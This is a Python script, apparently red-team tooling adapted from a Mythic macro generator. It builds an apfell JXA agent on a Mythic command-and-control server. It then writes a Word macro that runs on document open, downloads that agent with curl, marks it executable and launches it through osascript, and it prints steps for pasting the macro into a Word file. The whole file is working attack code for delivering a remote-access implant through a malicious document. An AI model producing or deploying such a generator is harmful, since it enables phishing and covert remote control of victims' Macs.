# Adapted from https://github.com/cedowens/Mythic-Macro-Generator

import asyncio, os
from .Utilities import *


def macro_word():
    payload = "./Payloads/MacroWord_Payload"
    # url = mythic_payload_url + "/Word_Macro.js"   # Used for where the JXA payload is hosted

    os.mkdir(payload, 0o775)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Word Macro",
                                           filename="Word_Macro.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            payload_info = await get_payload_data(mythic_instance=mythic_instance, payload_uuid=resp["uuid"])
            url = await get_payload_download_url(payload_info)
            # Download Payload
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/Word_Macro.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)  # write out to disk

            macrofile = open(payload + '/macro.txt', 'w')
            # macrofile.write('Sub AutoOpen()\n')
            macrofile.write('Sub Document_Open()\n')
            macrofile.write("MacScript(\"do shell script \"\"curl -k %s -o word.js\"\" \")" % url)
            macrofile.write("\n")
            macrofile.write("MacScript(\"do shell script \"\"chmod +x word.js\"\"\")")
            macrofile.write("\n")
            macrofile.write("MacScript(\"do shell script \"\"osascript word.js &\"\"\")")
            macrofile.write("\n")
            macrofile.write("End Sub")

            print("Notes: \n"
                  "1) Copy the macro from Payloads/MacroWord_Payload/macro.txt to past into Word Doc \n"
                  "2) When the macro is executed it will save to ~/Library/Containers/com.microsoft.Word/Data/word.js")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
